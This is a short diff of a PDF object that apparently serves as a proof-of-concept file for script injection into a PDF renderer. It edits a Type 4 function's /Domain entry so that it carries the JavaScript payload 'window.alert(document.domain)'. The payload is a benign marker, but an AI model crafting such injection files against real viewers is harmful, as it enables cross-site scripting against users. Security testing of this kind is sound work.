@@ -2,7 +2,7 @@
 1 0 obj
 <<
   /FunctionType 4
-  /Domain [(alert(document.domain)) 0]
+  /Domain [(window.alert(document.domain)) 0]
   /Range [0 0]
   /Length 12
 >>
